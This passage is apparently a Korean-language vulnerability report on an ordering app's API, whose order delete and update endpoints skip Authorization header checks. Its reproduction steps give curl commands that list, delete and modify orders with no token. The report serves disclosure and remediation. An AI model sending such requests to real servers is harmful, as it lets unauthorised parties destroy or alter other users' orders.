...
- 모바일 앱 UI에는 노출되지 않지만, 서버에서 `/api/order/delete/{id}`, `/api/order/update` 엔드포인트를 그대로 제공하며 Authorization 헤더 검증이 누락되어 있음  
- 아무 토큰 없이도 주문 삭제·수정 요청이 성공함

### 재현 절차
1. `GET /api/order/list` 요청으로 실제 주문 ID 목록을 확인함  
   ```bash
   curl http://<서버주소>/api/order/list
   ```
2. 확인된 주문 ID를 이용해 주문 수정 또는 삭제 요청을 전송함  
   ```bash
   # 주문 삭제 (Authorization 없이 호출)
   curl http://<서버주소>/api/order/delete/3

   # 주문 수정 (Authorization 없이 호출)
   curl -X POST http://<서버주소>/api/order/update \
     -H "Content-Type: application/json" \
     -d '{"id":3,"memberId":1,"storeId":1,"menuId":1,"quantity":1,"totalPrice":1000}'
   ```
3. Authorization 헤더를 제거하거나 임의 문자열로 설정해도 `{"responseType":"SUCCESS"}` 응답이 내려오며 주문이 실제로 삭제·수정됨
